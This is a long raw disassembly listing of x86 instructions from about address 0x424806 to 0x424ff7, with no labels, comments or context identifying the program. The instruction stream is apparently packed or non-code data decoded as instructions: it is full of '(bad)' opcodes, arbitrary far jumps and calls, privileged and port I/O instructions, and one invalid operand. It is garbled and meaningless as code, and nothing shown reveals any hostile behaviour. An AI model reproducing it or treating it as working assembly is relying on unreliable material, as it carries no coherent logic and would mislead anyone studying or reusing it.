  424806:	stos   BYTE PTR es:[edi],al
  424807:	shl    ecx,cl
  424809:	add    ebp,esp
  42480b:	sbb    ch,BYTE PTR [edx+ebp*1]
  42480e:	cwde   
  42480f:	pop    ebx
  424810:	ss sbb eax,0x8c6ae0c8
  424816:	push   DWORD PTR [ebp-0x7c071a70]
  42481c:	pop    edi
  42481d:	mov    bh,0xa9
  42481f:	test   BYTE PTR [edx+0x3334cc86],bh
  424825:	cmp    bh,cl
  424827:	test   BYTE PTR [edx-0x1d],0x8c
  42482b:	and    eax,0xfa636617
  424830:	das    
  424831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424832:	sbb    DWORD PTR [ecx-0x41],ecx
  424835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424836:	(bad)  
  424837:	fisub  WORD PTR [ebp+0x55]
  42483a:	jp     0x424863
  42483c:	and    al,0xb5
  42483e:	or     eax,0xf07b2d6b
  424843:	lea    ebp,[ecx-0x6a012fe8]
  424849:	cmc    
  42484a:	aaa    
  42484b:	aaa    
  42484c:	push   ds
  42484d:	cmp    eax,0xff4b3dc3
  424852:	jae    0x424808
  424854:	int    0x95
  424856:	mov    ds:0x59a3fbf,eax
  42485b:	or     ebx,DWORD PTR [edi+0x77]
  42485e:	xchg   esi,eax
  42485f:	xor    eax,0x2f6eed69
  424864:	sub    eax,0xc562bb74
  424869:	(bad)  
  42486b:	add    eax,0xd47c26a6
  424870:	xchg   ebp,eax
  424871:	mov    BYTE PTR [edi-0x56c4929e],ch
  424877:	jae    0x424895
  424879:	out    dx,al
  42487a:	dec    ebx
  42487b:	(bad)  
  42487d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42487e:	test   DWORD PTR ds:0x5504fc95,esp
  424884:	adc    al,0xea
  424886:	sub    dl,ch
  424888:	push   eax
  424889:	mov    al,0x36
  42488b:	xchg   ebp,eax
  42488c:	fdivrp st(0),st
  42488e:	xor    edi,DWORD PTR [edx+ebp*1]
  424891:	add    ah,bl
  424893:	sahf   
  424894:	cli    
  424895:	fld    DWORD PTR ds:0xd7a0002d
  42489b:	push   0xad68937a
  4248a0:	cmp    eax,0x16ab98a5
  4248a5:	loop   0x424848
  4248a7:	cs xor al,0xd7
  4248aa:	lods   eax,DWORD PTR ds:[esi]
  4248ab:	icebp  
  4248ac:	or     BYTE PTR [ecx],ch
  4248ae:	add    BYTE PTR [edx+esi*2],dl
  4248b1:	test   DWORD PTR [ecx],edx
  4248b3:	xor    al,0xcf
  4248b5:	fisubr WORD PTR [edx]
  4248b7:	push   ebx
  4248b8:	ret    0xaca6
  4248bb:	arpl   WORD PTR [ecx+0x19],bx
  4248be:	mov    dl,0x30
  4248c0:	xchg   DWORD PTR [esp+ebp*2+0x37],edi
  4248c4:	mov    cl,BYTE PTR [edi]
  4248c6:	stos   BYTE PTR es:[edi],al
  4248c7:	(bad)
  4248ca:	cwde   
  4248cb:	ins    BYTE PTR es:[edi],dx
  4248cc:	xchg   edi,eax
  4248cd:	sbb    al,dl
  4248cf:	push   ds
  4248d0:	fscale 
  4248d2:	sub    BYTE PTR ds:0x706722a5,dh
  4248d8:	sub    BYTE PTR [esi+0x3ba3c66b],dh
  4248de:	cmp    al,0x30
  4248e0:	hlt    
  4248e1:	cmc    
  4248e2:	jo     0x424918
  4248e4:	int3   
  4248e5:	push   ebx
  4248e6:	stos   DWORD PTR es:[edi],eax
  4248e7:	int3   
  4248e8:	stos   BYTE PTR es:[edi],al
  4248e9:	in     al,dx
  4248ea:	push   eax
  4248eb:	(bad)  
  4248ec:	loopne 0x424899
  4248ee:	sbb    edi,eax
  4248f0:	mov    esi,0x96cb6ea3
  4248f5:	neg    DWORD PTR [ebx+0x3d]
  4248f8:	fnstenv [ecx+0x73cdf139]
  4248fe:	retf   0x820a
  424901:	mov    edi,edi
  424903:	inc    ebx
  424904:	rol    DWORD PTR [eax-0xb],cl
  424907:	lods   eax,DWORD PTR ds:[esi]
  424908:	(bad)  
  424909:	sbb    esp,DWORD PTR [ebp+0x56e4041c]
  42490f:	add    DWORD PTR [edx+0x6c],ecx
  424912:	adc    DWORD PTR ds:0xe59753d1,eax
  424918:	dec    ebp
  424919:	or     dh,cl
  42491b:	push   ss
  42491c:	fistp  DWORD PTR [eax]
  42491e:	sbb    ebp,edi
  424920:	inc    edi
  424921:	push   0xcdfd918a
  424926:	pop    ebp
  424927:	bound  esp,QWORD PTR [edx-0x20dd304d]
  42492d:	jmp    0x8124:0xce5baf92
  424934:	add    eax,0x47caee54
  424939:	sbb    DWORD PTR [ebx+0xe2f0735],ecx
  42493f:	adc    DWORD PTR [ecx],ebp
  424941:	pop    ecx
  424942:	pop    ss
  424943:	adc    eax,0x141d6523
  424948:	inc    edx
  424949:	test   al,0xf1
  42494b:	mov    dl,0xee
  42494d:	loope  0x4248de
  42494f:	cli    
  424950:	scas   al,BYTE PTR es:[edi]
  424951:	mov    bh,0x23
  424953:	es dec ebx
  424955:	imul   ebp,DWORD PTR [eax],0x2fe015ab
  42495b:	es mov ebx,0xe923cbed
  424961:	push   0xfd27d539
  424966:	ds dec eax
  424968:	ret    0xe5fd
  42496b:	push   ebp
  42496c:	cmp    al,0x46
  42496e:	mov    dh,0xd6
  424970:	cmp    ebp,ebp
  424972:	sub    al,0xe
  424974:	fwait
  424975:	push   cs
  424976:	mov    DWORD PTR [ebx+0x66],ebx
  424979:	into   
  42497a:	fimul  WORD PTR [edx-0x772ee9e4]
  424980:	daa    
  424981:	push   esp
  424982:	ret    
  424983:	hlt    
  424984:	jmp    0x4249ff
  424986:	push   cs
  424987:	sti    
  424988:	add    al,0xb1
  42498a:	add    eax,0x3fd2ab1
  42498f:	jno    0x42491c
  424991:	push   ecx
  424992:	test   eax,0x2f53a81c
  424997:	lods   eax,DWORD PTR ds:[esi]
  424998:	mov    esi,0x3b4caa5b
  42499d:	and    edi,DWORD PTR [eax+ebx*4]
  4249a0:	xchg   esi,eax
  4249a1:	mov    ah,0xab
  4249a3:	loopne 0x4249d5
  4249a5:	sbb    ah,BYTE PTR ds:0xb7c5bee6
  4249ab:	or     BYTE PTR [ebx],0x4c
  4249ae:	fwait
  4249af:	stos   DWORD PTR es:[edi],eax
  4249b0:	(bad)  
  4249b2:	popf   
  4249b3:	pop    edi
  4249b4:	je     0x424a2c
  4249b6:	fldcw  WORD PTR [ebx]
  4249b8:	scas   eax,DWORD PTR es:[edi]
  4249b9:	jae    0x4249e2
  4249bb:	sbb    eax,0x8e546703
  4249c0:	pop    ecx
  4249c1:	int3   
  4249c2:	dec    esi
  4249c3:	mov    bl,BYTE PTR [edi-0x13]
  4249c6:	nop
  4249c7:	lea    edi,[edx-0xd]
  4249ca:	dec    esi
  4249cb:	or     bl,cl
  4249cd:	push   edi
  4249ce:	ins    BYTE PTR es:[edi],dx
  4249cf:	dec    ecx
  4249d0:	cli    
  4249d1:	dec    edi
  4249d2:	jg     0x4249f0
  4249d4:	jbe    0x424984
  4249d6:	mov    ecx,0x134a9389
  4249db:	and    al,0x2c
  4249dd:	fcom   DWORD PTR [edi+0x544407a6]
  4249e3:	je     0x42496e
  4249e5:	push   ecx
  4249e6:	dec    ebp
  4249e7:	lock imul edi,DWORD PTR [esi+eax*8],0x87bbaffa
  4249ef:	xchg   BYTE PTR [ecx+0x3b35e7e4],dl
  4249f5:	pop    esp
  4249f6:	jl     0x424a6a
  4249f8:	mov    cl,0xe4
  4249fa:	push   edi
  4249fb:	loope  0x424a7c
  4249fd:	leave  
  4249fe:	cmp    ah,BYTE PTR [edi+0x75]
  424a01:	addr16 in eax,0x11
  424a04:	cmp    eax,0x63f102ad
  424a09:	jns    0x4249b7
  424a0b:	sahf   
  424a0c:	sbb    BYTE PTR [esp+eax*4],dl
  424a0f:	jp     0x424a2b
  424a11:	add    dh,BYTE PTR [ebp+0x64]
  424a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a15:	mov    WORD PTR [edi],cs
  424a17:	xchg   esp,eax
  424a18:	out    0xab,al
  424a1a:	push   edi
  424a1b:	adc    DWORD PTR [eax],ecx
  424a1d:	mov    ebp,0x6bd4d1aa
  424a22:	mov    edx,0x160ff7ea
  424a27:	std    
  424a28:	test   BYTE PTR [ecx+0xc],cl
  424a2b:	sub    al,0x24
  424a2d:	cs sahf 
  424a2f:	inc    ebx
  424a30:	ja     0x424a51
  424a32:	cwde   
  424a33:	lahf   
  424a34:	dec    ebp
  424a35:	fld    TBYTE PTR [ebx]
  424a37:	iret   
  424a38:	inc    esi
  424a39:	dec    edi
  424a3a:	and    esi,DWORD PTR [esp+ebp*2-0xf]
  424a3e:	inc    esp
  424a3f:	int    0xdd
  424a41:	sub    DWORD PTR [ebp+0x7f8137c2],ebp
  424a47:	add    ebp,ebp
  424a49:	inc    esp
  424a4a:	dec    edi
  424a4b:	mov    esi,0x7abad1a7
  424a50:	mov    cl,0xb7
  424a52:	xor    BYTE PTR [edx+0x3a72d7af],0x82
  424a59:	xor    BYTE PTR [eax+eiz*2+0x54],bh
  424a5d:	sub    BYTE PTR [eax],cl
  424a5f:	adc    al,0x8f
  424a61:	xor    dl,BYTE PTR [ebp+0x25]
  424a64:	mov    bl,0xd
  424a66:	inc    edi
  424a67:	pop    ss
  424a68:	mov    bh,0x97
  424a6a:	xlat   BYTE PTR ds:[ebx]
  424a6b:	iret   
  424a6c:	push   es
  424a6d:	clc    
  424a6e:	jmp    0x118d:0x69791f82
  424a75:	mov    ?,WORD PTR [esp+esi*2+0x29448de8]
  424a7c:	in     eax,dx
  424a7d:	dec    edx
  424a7e:	push   ebx
  424a7f:	xor    esi,DWORD PTR [edx+0x5d6cfa72]
  424a85:	dec    edi
  424a86:	(bad)  
  424a87:	outs   dx,DWORD PTR ds:[esi]
  424a88:	and    ebx,DWORD PTR [ebp+0x67e93b0e]
  424a8e:	or     al,0xde
  424a90:	mov    ch,BYTE PTR [eax+ecx*1-0x6f25da36]
  424a97:	(bad)  
  424a98:	call   0x6f27:0xff2ed94d
  424a9f:	mov    cl,0xd5
  424aa1:	sbb    eax,0xade5b36a
  424aa6:	sub    BYTE PTR [ecx-0x65],al
  424aa9:	cmp    BYTE PTR [ecx-0x755b1b35],dh
  424aaf:	pop    esi
  424ab0:	not    BYTE PTR [ebx+0x2]
  424ab3:	mov    eax,ds:0x477f6a00
  424ab8:	call   0xc961d007
  424abd:	sbb    al,0x35
  424abf:	shl    DWORD PTR [ebx+0x68],cl
  424ac2:	mov    bh,0x7e
  424ac4:	in     eax,dx
  424ac5:	sbb    DWORD PTR [edi+0x5254c105],edi
  424acb:	fisubr DWORD PTR [edx+0x62]
  424ace:	pop    es
  424acf:	dec    edi
  424ad0:	jmp    0x424aa5
  424ad2:	pop    ebp
  424ad3:	or     ah,dh
  424ad5:	mov    ds:0x772d5075,al
  424ada:	das    
  424adb:	(bad)  
  424adc:	dec    ecx
  424add:	mov    ds:0xfa6ec0f,al
  424ae2:	(bad)  
  424ae4:	fbstp  TBYTE PTR [eax-0x5c]
  424ae7:	mov    bl,0x94
  424ae9:	add    DWORD PTR [edx-0x3f],ebx
  424aec:	jp     0x424b4c
  424aee:	mov    esi,0x44c5c0ab
  424af3:	inc    ecx
  424af4:	xlat   BYTE PTR ds:[ebx]
  424af5:	mov    BYTE PTR [ecx-0x13d4599c],bl
  424afb:	xor    dl,bl
  424afd:	pop    edi
  424afe:	loopne 0x424a94
  424b00:	sbb    dl,ch
  424b02:	imul   eax,DWORD PTR ds:0xddfb757f,0x2589f9a0
  424b0c:	pusha  
  424b0d:	mov    ecx,0xea628e98
  424b12:	jmp    0x424b6d
  424b14:	inc    esi
  424b15:	dec    ebp
  424b16:	mov    esp,ebx
  424b18:	inc    ebp
  424b19:	enter  0xf4a3,0x54
  424b1d:	shr    DWORD PTR [ebx],cl
  424b1f:	add    bl,bl
  424b21:	mov    ebx,0x75615fe0
  424b26:	mov    edx,0x350f6c7f
  424b2b:	dec    ecx
  424b2c:	pop    edx
  424b2d:	in     eax,0x91
  424b2f:	cmp    al,0xe0
  424b31:	jne    0xa9b359e6
  424b37:	mov    ds:0xd3ad3772,eax
  424b3c:	lock pop ds
  424b3e:	out    dx,eax
  424b3f:	sbb    al,0xb1
  424b41:	outs   dx,DWORD PTR ds:[esi]
  424b42:	and    al,0xb7
  424b44:	jp     0x424b04
  424b46:	icebp  
  424b47:	ror    bl,0x13
  424b4a:	imul   ebx
  424b4c:	cmp    eax,0x8c1ff3e
  424b51:	mov    esi,0x36f74d8e
  424b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b57:	mul    BYTE PTR [edi+0x54]
  424b5a:	push   ecx
  424b5b:	mov    BYTE PTR [ebx+0x614559c4],0x2f
  424b62:	adc    dh,cl
  424b64:	call   0xf8274dfe
  424b69:	ja     0x424b5e
  424b6b:	sar    BYTE PTR [ebx+ecx*8-0x1d],0x2c
  424b70:	push   esi
  424b71:	push   edx
  424b72:	cs repnz inc esp
  424b75:	stos   DWORD PTR es:[edi],eax
  424b76:	xchg   esp,eax
  424b77:	add    BYTE PTR [ecx+0x78],bl
  424b7a:	inc    edx
  424b7b:	push   edi
  424b7c:	nop
  424b7d:	and    edx,DWORD PTR [edi-0x42]
  424b80:	add    eax,0xcde67d7b
  424b85:	mov    ecx,0xf78fd70a
  424b8a:	cmp    eax,0xb0aa1722
  424b8f:	or     esi,ecx
  424b91:	inc    eax
  424b92:	mov    ecx,0x2f260bc7
  424b97:	das    
  424b98:	int    0x57
  424b9a:	fnstenv [eax+edx*4]
  424b9d:	(bad)
  424ba1:	cmp    DWORD PTR [ebp-0x32],ebx
  424ba4:	iret   
  424ba5:	jg     0x424c0b
  424ba7:	std    
  424ba8:	cli    
  424ba9:	jg     0x424b5a
  424bab:	xchg   DWORD PTR [ebx+0x3c],edi
  424bae:	ins    DWORD PTR es:[edi],dx
  424baf:	xchg   edx,eax
  424bb0:	aas    
  424bb1:	(bad)  
  424bb2:	fist   WORD PTR [ebx-0x61]
  424bb5:	sar    DWORD PTR [eax+0x57ece31f],1
  424bbb:	lock adc esp,DWORD PTR [eax+ebp*8]
  424bbf:	popa   
  424bc0:	lods   eax,DWORD PTR ds:[esi]
  424bc1:	pop    esp
  424bc2:	xor    al,0xef
  424bc4:	(bad)  
  424bc5:	(bad)  
  424bc6:	es sub ecx,DWORD PTR es:[eax+0x2e0f6d28]
  424bce:	xor    eax,0x809599d6
  424bd3:	loop   0x424c30
  424bd5:	scas   eax,DWORD PTR es:[edi]
  424bd6:	lods   al,BYTE PTR ds:[esi]
  424bd7:	fimul  WORD PTR [ecx-0x12447a8a]
  424bdd:	sbb    eax,0x13ba70a
  424be2:	cli    
  424be3:	dec    esi
  424be4:	int    0x7a
  424be6:	cli    
  424be7:	or     DWORD PTR [esi+0x64],0xe5a39ff1
  424bee:	and    eax,0x5da102eb
  424bf3:	pushf  
  424bf4:	shl    BYTE PTR ds:0x748a49a7,cl
  424bfa:	fmul   st,st(6)
  424bfc:	push   es
  424bfd:	retf   0x7aa0
  424c00:	push   edx
  424c01:	or     ebx,DWORD PTR [ebx]
  424c03:	sub    ch,BYTE PTR [edi]
  424c05:	and    DWORD PTR [ecx+0x30a60cc5],esi
	...
  424c27:	add    BYTE PTR [eax],al
  424c29:	add    BYTE PTR [edx+0x41],dl
  424c2c:	push   esp
  424c2d:	push   edx
  424c2e:	push   edi
  424c2f:	push   edi
  424c30:	push   esi
  424c31:	inc    ecx
  424c32:	ror    DWORD PTR [ebx-0x49],1
  424c35:	popf   
  424c36:	jge    0x424c6e
  424c38:	push   cs
  424c39:	int    0xce
  424c3b:	fadd   DWORD PTR [ecx]
  424c3d:	add    BYTE PTR [ecx-0x3cfffffa],cl
  424c43:	xor    al,0x84
  424c45:	sahf   
  424c46:	and    DWORD PTR [ebx],ebx
  424c48:	dec    edx
  424c49:	fild   DWORD PTR [ecx+0x1a]
  424c4c:	adc    edx,DWORD PTR [edx+0x34d216db]
  424c52:	mov    al,0x62
  424c54:	icebp  
  424c55:	jmp    0x73b60e83
  424c5a:	sub    BYTE PTR [ebp-0x6c],0x55
  424c5e:	or     dh,BYTE PTR [edx-0x58c224d7]
  424c64:	fnstcw WORD PTR [eax+0x6e]
  424c67:	lds    eax,FWORD PTR [ebx+0x33]
  424c6a:	enter  0x559c,0x6d
  424c6e:	mov    al,ds:0x2760d213
  424c73:	mov    ds:0xd276814d,eax
  424c78:	fisubr DWORD PTR [ebx+0x27e19a81]
  424c7e:	loop   0x424cdb
  424c80:	ror    bh,0xa8
  424c83:	inc    edx
  424c84:	js     0x424c27
  424c86:	xor    eax,0xa398996a
  424c8b:	push   es
  424c8c:	daa    
  424c8d:	in     eax,dx
  424c8e:	fbstp  TBYTE PTR ds:0xf9fc0b8
  424c94:	jecxz  0x424c9c
  424c96:	sub    BYTE PTR [edx],0xb2
  424c99:	daa    
  424c9a:	into   
  424c9b:	gs inc edx
  424c9d:	mov    ebp,0x71f3bc2b
  424ca2:	cdq    
  424ca3:	push   ebp
  424ca4:	jmp    0xf3a7:0x4a9a9ed
  424cab:	pop    ebx
  424cac:	imul   esi,esp,0x36
  424caf:	jnp    0x424cf6
  424cb1:	retf   0x5adb
  424cb4:	out    0x8c,eax
  424cb6:	jg     0x424cbe
  424cb8:	cdq    
  424cb9:	ret    0x38e
  424cbc:	inc    ebp
  424cbd:	std    
  424cbe:	push   ss
  424cbf:	div    BYTE PTR [eax+0x72]
  424cc2:	push   ebp
  424cc3:	adc    DWORD PTR [ecx-0x4b41fa23],ebx
  424cc9:	loop   0x424c5a
  424ccb:	(bad)  
  424ccc:	in     al,0xfb
  424cce:	(bad)  
  424ccf:	rcl    BYTE PTR [esi-0x4b5eda10],cl
  424cd5:	dec    ebp
  424cd6:	aas    
  424cd7:	cmp    eax,0x89351696
  424cdc:	test   eax,0xfd4d2d1e
  424ce1:	push   ds
  424ce2:	pop    edi
  424ce3:	sub    DWORD PTR [edi-0x73],0x42bda999
  424cea:	lahf   
  424ceb:	or     ebp,ecx
  424ced:	xor    dl,BYTE PTR [ebp+0x5a78b664]
  424cf3:	dec    edx
  424cf4:	jle    0x424d73
  424cf6:	adc    al,0x12
  424cf8:	cmc    
  424cf9:	out    dx,eax
  424cfa:	or     BYTE PTR [esi+0x6d],bh
  424cfd:	mov    esi,0x75ed6c21
  424d02:	cmp    eax,DWORD PTR [edx+0x68]
  424d05:	call   0xcf7c2402
  424d0a:	fisub  DWORD PTR [ebx+ebx*4]
  424d0d:	and    DWORD PTR [edx],ebx
  424d0f:	inc    ecx
  424d10:	sbb    eax,0x1aeee939
  424d15:	mov    ds:0x6d952ca,eax
  424d1a:	mov    ds:0x4a2b3dda,eax
  424d1f:	mov    edi,0xde323e1b
  424d24:	mov    WORD PTR [esi+0x6d],ds
  424d27:	call   0x711a18f8
  424d2c:	inc    eax
  424d2d:	dec    edx
  424d2e:	ret    0xd062
  424d31:	adc    ah,BYTE PTR [ecx]
  424d33:	fsub   QWORD PTR [esi+0x73b5346e]
  424d39:	dec    esi
  424d3a:	or     BYTE PTR [ebx+0x3a],dl
  424d3d:	mov    edx,0xd104304b
  424d42:	lahf   
  424d43:	dec    ebx
  424d44:	mov    dh,bh
  424d46:	fnstenv [eax+ebp*1]
  424d49:	sbb    cl,cl
  424d4b:	push   0xfaf93649
  424d50:	inc    ecx
  424d51:	xchg   esp,eax
  424d52:	fistp  QWORD PTR [ebp-0x6a09f05]
  424d58:	sub    dh,cl
  424d5a:	cmp    dl,cl
  424d5c:	mov    al,0x6a
  424d5e:	mov    dl,0x49
  424d60:	pop    ebp
  424d62:	ficom  WORD PTR [si]
  424d65:	and    DWORD PTR [ebx+0x2f],edi
  424d68:	aaa    
  424d69:	dec    ebp
  424d6a:	sub    ch,BYTE PTR [ecx+0x16]
  424d6d:	push   ebp
  424d6e:	int3   
  424d6f:	xchg   edi,eax
  424d70:	test   BYTE PTR [esi],dh
  424d72:	push   es
  424d73:	mov    esi,0x245f2648
  424d78:	cmp    DWORD PTR [ebx],ecx
  424d7a:	ficom  DWORD PTR [edi-0x2bec97b8]
  424d80:	add    al,0x7d
  424d82:	xor    al,0x66
  424d84:	sub    eax,0xf4ae2010
  424d89:	inc    ebp
  424d8a:	xchg   edx,eax
  424d8b:	add    eax,0xdb474ade
  424d90:	pop    edi
  424d91:	cmp    DWORD PTR [edx-0x59],eax
  424d94:	push   es
  424d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d96:	xor    BYTE PTR [ebx+0x6f],cl
  424d99:	test   DWORD PTR [edx+0x649f2120],0xc265cf42
  424da3:	push   ss
  424da4:	(bad)  
  424da6:	jl     0x424d3b
  424da8:	mov    bl,0xb9
  424daa:	iret   
  424dab:	retf   
  424dac:	mov    dl,0x4c
  424dae:	inc    eax
  424daf:	adc    ecx,DWORD PTR [edi-0x380f3867]
  424db5:	dec    esp
  424db6:	push   ecx
  424db7:	dec    esi
  424db8:	retf   
  424db9:	dec    edx
  424dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dbb:	or     BYTE PTR [esi+0x19610554],0xb8
  424dc2:	clc    
  424dc3:	pop    es
  424dc4:	mov    eax,esp
  424dc6:	push   cs
  424dc7:	rsm    
  424dc9:	dec    esi
  424dca:	sbb    eax,0x181c1f7d
  424dcf:	jb     0x424d98
  424dd1:	pop    ebp
  424dd2:	mov    al,ds:0x9d3111a1
  424dd7:	and    al,BYTE PTR [edi+0x1830284e]
  424ddd:	xchg   edi,eax
  424dde:	jo     0x424d87
  424de0:	adc    al,0xe5
  424de2:	int3   
  424de3:	cwde   
  424de4:	add    esp,ebp
  424de6:	xlat   BYTE PTR ds:[ebx]
  424de7:	adc    bl,BYTE PTR [edi+0x6233c4b3]
  424ded:	jne    0x424d80
  424def:	jbe    0x424d8f
  424df1:	jecxz  0x424d8d
  424df3:	cld    
  424df4:	sub    BYTE PTR ds:0x6da810b6,dl
  424dfa:	xchg   ecx,eax
  424dfb:	xchg   dh,bl
  424dfd:	popa   
  424dfe:	aas    
  424dff:	stc    
  424e00:	pop    esi
  424e01:	mov    ds:0xc096a3e7,eax
  424e06:	adc    DWORD PTR [ebx-0x7c],0xfffffff2
  424e0a:	stos   BYTE PTR es:[edi],al
  424e0b:	push   eax
  424e0c:	sbb    eax,0x89ced69a
  424e11:	adc    BYTE PTR [ecx],al
  424e13:	add    al,0x94
  424e15:	cmp    esp,eax
  424e17:	push   es
  424e18:	mov    dh,0x78
  424e1a:	xchg   ah,bh
  424e1c:	dec    esi
  424e1d:	cmp    ebp,DWORD PTR [ecx-0x1363ff0c]
  424e23:	ret    
  424e24:	cmp    eax,0x43510283
  424e29:	(bad)  
  424e2a:	cmc    
  424e2b:	and    eax,0x84bbbf1c
  424e30:	ja     0x424e32
  424e32:	push   edi
  424e33:	popf   
  424e34:	loopne 0x424e5f
  424e36:	inc    edx
  424e37:	mov    dh,dh
  424e39:	jmp    0x7e58:0x25b4507e
  424e40:	(bad)  
  424e41:	mov    ebp,0xc7e1533e
  424e46:	repz inc esp
  424e48:	pusha  
  424e49:	outs   dx,DWORD PTR ds:[esi]
  424e4a:	inc    ebx
  424e4b:	mov    ah,0x2c
  424e4d:	jg     0x424e02
  424e4f:	push   cs
  424e50:	lss    eax,FWORD PTR [ebx+0x6794a40d]
  424e57:	mov    ds:0xdaf0097,al
  424e5c:	(bad)  
  424e5d:	xchg   al,ah
  424e5f:	push   esi
  424e60:	and    cl,BYTE PTR [edi+0x53]
  424e63:	xor    al,0xda
  424e65:	mov    ecx,0x29dc14c4
  424e6a:	jae    0x424e3b
  424e6c:	bound  ebp,QWORD PTR [ecx+ebp*8]
  424e6f:	inc    ebp
  424e70:	mov    edi,0x5c29cb10
  424e75:	aaa    
  424e76:	sub    al,0xf9
  424e78:	pop    esp
  424e79:	ja     0x424e98
  424e7b:	das    
  424e7c:	or     DWORD PTR [eax],edi
  424e7e:	mov    esp,0x4d458ff0
  424e83:	mov    edx,0x3f98f746
  424e88:	inc    esi
  424e89:	pop    edx
  424e8a:	iretw  
  424e8c:	and    edx,DWORD PTR [eax-0x3fdf4cd4]
  424e92:	adc    esp,DWORD PTR [ebx+ebp*8]
  424e95:	mov    al,BYTE PTR [ecx-0x23]
  424e98:	cmp    ebp,edx
  424e9a:	mov    esp,0xcadfabb2
  424e9f:	mov    ebx,0x2bafdc04
  424ea4:	pushf  
  424ea5:	and    BYTE PTR [edx-0xfc094d4],bh
  424eab:	xor    DWORD PTR [ecx+ebp*8+0x49],ecx
  424eaf:	fwait
  424eb0:	jo     0x424ec1
  424eb2:	das    
  424eb3:	ins    BYTE PTR es:[edi],dx
  424eb4:	add    BYTE PTR [ecx+0x62],bl
  424eb7:	fisubr WORD PTR [edi-0x7e874cb3]
  424ebd:	fidiv  DWORD PTR [ecx+eax*4-0x5113af0d]
  424ec4:	shr    cl,cl
  424ec6:	sbb    DWORD PTR [ecx+0x18249c90],edx
  424ecc:	jno    0x424eff
  424ece:	jp     0x424ede
  424ed0:	lds    ebx,FWORD PTR [ebp+0x61]
  424ed3:	jb     0x424ee1
  424ed5:	js     0x424ebe
  424ed7:	mov    eax,ds:0x9957f9c2
  424edc:	cdq    
  424edd:	fwait
  424ede:	and    edx,ecx
  424ee0:	or     eax,0x2d7d99e7
  424ee5:	inc    eax
  424ee6:	ins    BYTE PTR es:[edi],dx
  424ee7:	shr    DWORD PTR [esi],cl
  424ee9:	sbb    eax,DWORD PTR [edi+0x5c]
  424eec:	jg     0x424f65
  424eee:	push   eax
  424eef:	sbb    al,0x34
  424ef1:	sub    BYTE PTR [edi+0x5daaed0c],cl
  424ef7:	xchg   ebp,eax
  424ef8:	inc    edx
  424ef9:	jnp    0x424f1c
  424efb:	fidiv  DWORD PTR [esi+0x23]
  424efe:	sbb    edx,edi
  424f00:	adc    BYTE PTR [edx+0x60722a5],bl
  424f06:	pusha  
  424f07:	in     al,dx
  424f08:	jmp    0xfe0671e0
  424f0d:	popa   
  424f0e:	retf   
  424f0f:	and    eax,0xb441b86
  424f14:	pop    ebp
  424f15:	push   ebp
  424f16:	sub    ecx,ebx
  424f18:	mov    bl,0x4b
  424f1a:	pop    edx
  424f1b:	ins    DWORD PTR es:[edi],dx
  424f1c:	sub    bh,BYTE PTR ds:0xb2f445d7
  424f22:	pop    ds
  424f23:	ja     0x424ef4
  424f25:	gs imul ecx,esi,0x1c
  424f29:	sub    ch,BYTE PTR [ecx]
  424f2b:	inc    ebp
  424f2c:	pusha  
  424f2d:	scas   al,BYTE PTR es:[edi]
  424f2e:	sbb    ah,ch
  424f30:	push   esi
  424f31:	sbb    DWORD PTR [edx-0x74466225],esi
  424f37:	rcr    DWORD PTR [eax+0xdc65ccb],0x3e
  424f3e:	adc    BYTE PTR [ebp+esi*2+0x4fa2edf8],bh
  424f45:	cmc    
  424f46:	leave  
  424f47:	dec    edx
  424f48:	ins    DWORD PTR es:[edi],dx
  424f49:	add    al,0xc9
  424f4b:	pop    ebx
  424f4c:	nop
  424f4d:	xchg   ebx,eax
  424f4e:	xchg   edi,eax
  424f4f:	cmp    eax,DWORD PTR [ecx-0xd]
  424f52:	(bad)  
  424f53:	mov    WORD PTR [ebx+0x2b],ss
  424f56:	enter  0x3b06,0xe7
  424f5a:	jno    0x424f0b
  424f5c:	scas   eax,DWORD PTR es:[di]
  424f5e:	out    dx,al
  424f5f:	mov    eax,0x29784ef6
  424f64:	es adc al,0x96
  424f67:	or     edi,ebx
  424f69:	shl    DWORD PTR [edx-0x3a],1
  424f6c:	xor    ecx,DWORD PTR gs:[ebp+0x17]
  424f70:	aam    0x26
  424f72:	push   es
  424f73:	shl    dh,cl
  424f75:	adc    bh,dl
  424f77:	enter  0xbd1a,0xb
  424f7b:	out    dx,al
  424f7c:	mov    DWORD PTR [edx+0x5d4a8f7d],esi
  424f82:	or     BYTE PTR [eax-0x68],bl
  424f85:	or     al,BYTE PTR [ebp+0x67e3bb3b]
  424f8b:	mov    bl,0x6d
  424f8d:	ss jne 0x424f2e
  424f90:	ror    BYTE PTR [ebx-0x2f],1
  424f93:	and    BYTE PTR [ebx-0x68],dh
  424f96:	stos   BYTE PTR es:[edi],al
  424f97:	add    edi,DWORD PTR [edi+ebx*2+0x732e59af]
  424f9e:	enter  0x6dee,0x54
  424fa2:	jmp    0x1c15:0xf4d8e4f4
  424fa9:	ja     0x424f58
  424fab:	mov    edx,DWORD PTR [edi-0x1f]
  424fae:	inc    edx
  424faf:	mov    cl,0x3a
  424fb1:	pop    esi
  424fb2:	iret   
  424fb3:	loop   0x424fe7
  424fb5:	loopne 0x425033
  424fb7:	xchg   esp,eax
  424fb8:	mov    al,0xdc
  424fba:	mov    edx,0xd5eeabf3
  424fbf:	sbb    dl,BYTE PTR [esi+0x36]
  424fc2:	mov    dh,0xc7
  424fc4:	or     DWORD PTR [edx],0xcc1c2d52
  424fca:	dec    edi
  424fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fcc:	mov    WORD PTR [eax],gs
  424fce:	push   eax
  424fcf:	mov    eax,ds:0x7ed47107
  424fd4:	xchg   esp,eax
  424fd5:	jns    0x42504a
  424fd7:	test   DWORD PTR [edx+0xb],0x25c9fc9a
  424fde:	mov    edx,0xd91b7d6e
  424fe3:	cdq    
  424fe4:	js     0x424fd2
  424fe6:	scas   al,BYTE PTR es:[edi]
  424fe7:	ret    
  424fe8:	sbb    esi,esi
  424fea:	nop
  424feb:	ins    BYTE PTR es:[edi],dx
  424fec:	mov    esi,0xdbb31473
  424ff1:	or     bl,BYTE PTR [edi-0x4f584be2]
  424ff7:	imul   edi,DWORD PTR ds:0x81cccb89,0xa585ccd
